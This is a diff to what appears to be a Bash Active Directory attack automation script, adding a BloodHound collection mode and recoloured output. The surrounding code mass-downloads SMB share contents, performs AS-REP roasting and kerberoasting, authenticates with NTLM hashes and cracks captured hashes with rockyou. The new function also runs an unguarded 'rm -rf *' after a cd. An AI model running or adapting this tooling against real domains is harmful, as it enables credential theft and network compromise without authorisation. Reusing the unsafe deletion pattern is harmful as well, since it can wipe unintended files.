@@ -6,13 +6,14 @@ password=''
 domain=''
 target=''
 hash=''
-pass_wordlist='/usr/share/wordlist/rockyou.txt'
+pass_wordlist='/usr/share/wordlists/rockyou.txt'
 full_enabled=false
 smb_enabled=false
 kerberos_enabled=false
 ldap_enabled=false
 crack_enabled=false
 winrm_enabled=false
+bloodhound_enabled=false
 
 # declare colors 
 RED="\033[1;31m"
@@ -21,6 +22,8 @@ RESET="\033[0m"
 GREEN="\033[1;32m"
 PURPLE="\033[1;35m"
 ORANGE="\033[1;33m"
+PINK="\033[1;35m"
+
 
 
 # display_usage function
@@ -69,7 +72,7 @@ enum_smb(){
 		echo -e "${RED} [-] Could not list SMB shares"
 		rm -rf $smb_file 
 	else
-		echo -e "${GREEN} [+] SMB Share Drives Results Saved To ${smb_file}${RESET}"
+		echo -e "${GREEN} [+] SMB Share Drives Results Saved To ${PINK}${smb_file}${RESET}"
 	fi
 }
 
@@ -111,7 +114,7 @@ smb_conn(){
 		if [ -s $smb_shares ];then
 			while IFS= read -r share; do
 				if ! [ -z $share ]; then
-					echo -e "${GREEN} [+] Downloading Files From $share SMB Share...${RESET}"
+					echo -e "${GREEN} [+] Downloading Files From ${PINK} $share ${GREEN} SMB Share...${RESET}"
 					if [ -z "$username" ] || [ -z "$password" ]; then
 						smbclient //$domain/$share  -c 'prompt OFF;recurse ON;mget *;exit;' -N
 					else
@@ -120,7 +123,7 @@ smb_conn(){
 				fi
 				
 			done < "$smb_shares"
-			echo -e "${GREEN} [+] Files saved to  $smb_shares_directory ${RESET}"
+			echo -e "${GREEN} [+] Files saved to  ${PINK} $smb_shares_directory ${RESET}"
 		fi
 		cd $current_directory
 	fi
@@ -155,8 +158,8 @@ enum_lookup(){
 		echo -e "${RED} [-] Could not retrieve lookupsids and users"
 		rm -rf $lookupsid_file $users_file
 	else 
-		echo -e "${GREEN} [+] Users Results Saved To ${users_file}${RESET}"
-		echo -e "${GREEN} [+] Lookupsid Results Saved To ${lookupsid_file}${RESET}"
+		echo -e "${GREEN} [+] Users Results Saved To ${PINK} ${users_file}${RESET}"
+		echo -e "${GREEN} [+] Lookupsid Results Saved To ${PINK} ${lookupsid_file}${RESET}"
 	fi
 }
 
@@ -181,7 +184,7 @@ enum_kerberos(){
 			GetNPUsers.py $domain/$username@$domain -usersfile $users_file  -hashes ":$hash" | grep '^$krb5asrep' > $get_np_users_file 
 		fi
 		
-		echo -e "${GREEN} [+] GetNPUsers Results Saved To ${get_np_users_file}${RESET}"
+		echo -e "${GREEN} [+] GetNPUsers Results Saved To ${PINK} ${get_np_users_file}${RESET}"
 	else 
 		echo -e "${RED} [-] Could not perform kerberoasting with NPUsers"
 		rm -rf $get_np_users_file
@@ -204,7 +207,7 @@ enum_kerberos(){
 	fi
 	
 	if  [ -s $get_user_spn_file ] || grep -q "[-] Error" "$get_user_spn_file"; then
-		echo -e "${GREEN} [+] GetUserSPNs Results Saved To ${get_user_spn_file}${RESET}"
+		echo -e "${GREEN} [+] GetUserSPNs Results Saved To ${PINK} ${get_user_spn_file}${RESET}"
 	else
 		echo -e "${RED} [-] Could not perform kerberoasting with GetUserSPNs"
 		rm -rf $get_user_spn_file
@@ -234,7 +237,7 @@ crack_pass(){
 		
 		
 		if [ -s $cracked_kerberos_file ]; then
-			echo -e "${GREEN} [+] Cracked A Few Passwords, Saved to ${cracked_kerberos_file} ${RESET}"
+			echo -e "${GREEN} [+] Cracked A Few Passwords, Saved To ${PINK} ${cracked_kerberos_file} ${RESET}"
 		else
 			echo -e "${RED} [-] Could not crack the hashes ${RESET}"
 			rm -rf $cracked_kerberos_file
@@ -252,12 +255,33 @@ enum_ldap(){
 	fi
 
 	if  [ -s $ldap_file ]; then
-		echo -e "${GREEN} [+] Ldap Results Saved To ${ldap_file}${RESET}"
+		echo -e "${GREEN} [+] Ldap Results Saved To ${PINK} ${ldap_file}${RESET}"
 	else
 		echo -e "${RED} [-] Could not run ldap"
 	fi
 }
 
+
+enum_bloodhound(){
+	echo -e "${ORANGE} [*] Enumerating Bloodhound...${RESET}"
+	echo -e "${PURPLE} [!] Running bloodhound-python ${RESET}"
+	cd $bloodhound_directory
+	rm -rf * # remove everything before we begin
+	if ! [ -z $username ] && ! [ -z $password ]; then
+		bloodhound-python -d $domain -u $username -p $password -ns $target -c all > /dev/null 2>&1
+	fi
+	# work with username and ntlm hash
+	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
+		bloodhound-python -d $domain -u $username --hashes ":$hash" -ns $target -c all   > /dev/null 2>&1
+	fi
+	output=$(ls | grep .json)
+	if [ -z "$output" ]; then
+		echo -e "${RED} [-] Bloodhound Enumeration was not successful.${RESET}"
+	else
+		echo -e "${GREEN} [+] Successfully Enumerated Bloodhound. Results saved to ${PINK} $bloodhound_directory ${RESET}"
+	fi
+	cd $current_directory
+}
 # remove empty files and folders 
 remove_empty(){
 	find $base_directory -depth -empty -delete
@@ -265,7 +289,7 @@ remove_empty(){
 
 # Function to display display_usage information
 display_usage() {
-    echo "Usage: $0 -u 'username' -p 'password' -t 'target' -H 'ntlm hash' -w 'wordlist' [--full] [--crack] [--shares] [--ldap] [--smb] [--winrm]"
+    echo "Usage: $0 -u 'username' -p 'password' -t 'target' -H 'ntlm hash' -w 'wordlist' [--full] [--crack] [--shares] [--ldap] [--smb] [--winrm] [--bloodhound]"
     echo "Options:"
     echo "  -u     		Username for authentication"
     echo "  -p   		Password for authentication"
@@ -277,6 +301,7 @@ display_usage() {
     echo "  --smb               Enable SMB Enumeration"
     echo "  --full              Enable full mode Enumeration"
     echo "  --winrm             Enable winrm mode Enumeration"
+    echo "  --bloodhound        Enable bloodhound mode Enumeration"
     echo "  --crack             Crack Found Hashes"
     echo "  -h, --help          Display this help message"
     exit
@@ -292,7 +317,7 @@ while getopts ":u:p:t:w:H:-:h" opt; do
         H) hash="$OPTARG" ;;
         -)
             case "${OPTARG}" in
-                kerberos|ldap|smb|full|crack|winrm) eval "${OPTARG}_enabled=true" ;;
+                kerberos|ldap|smb|full|crack|winrm|bloodhound) eval "${OPTARG}_enabled=true" ;;
                 *) echo "Unknown option: --${OPTARG}" >&2; exit 1 ;;
             esac
             ;;
@@ -318,6 +343,7 @@ lookupsid_directory=$target_directory/lookupsid_results
 kerberos_directory=$target_directory/kerberos_results
 ldap_directory=$target_directory/ldap_results
 smb_shares_directory=$smb_directory/smb
+bloodhound_directory=$target_directory/bloodhound_results
 
 # declare file names 
 get_np_users_file=$kerberos_directory/"GetNPUsers_results.txt"
@@ -328,6 +354,7 @@ lookupsid_file=$lookupsid_directory/"lookupsid_file.txt"
 users_file=$lookupsid_directory/"users.txt"
 smb_file=$smb_directory/"share_drives.txt"
 smb_shares=$smb_directory/"share_names.txt"
+
 
 
 
@@ -357,6 +384,9 @@ fi
 if [ ! -d "$ldap_directory" ];then
 	mkdir $ldap_directory
 fi 
+if [ ! -d "$bloodhound_directory" ];then
+	mkdir $bloodhound_directory
+fi 
 
 # display the banner
 banner
@@ -376,6 +406,7 @@ if ! [ -z "$domain" ]; then
 		enum_lookup
 		enum_kerberos
 		crack_pass
+		enum_bloodhound
 		enum_ldap
 		remove_empty
 		exit
@@ -396,6 +427,9 @@ if ! [ -z "$domain" ]; then
 	fi
 	if $winrm_enabled;then
 		enum_winrm
+	fi
+	if $bloodhound_enabled;then
+		enum_bloodhound
 	fi
 	if $crack_enabled;then
 		crack_pass
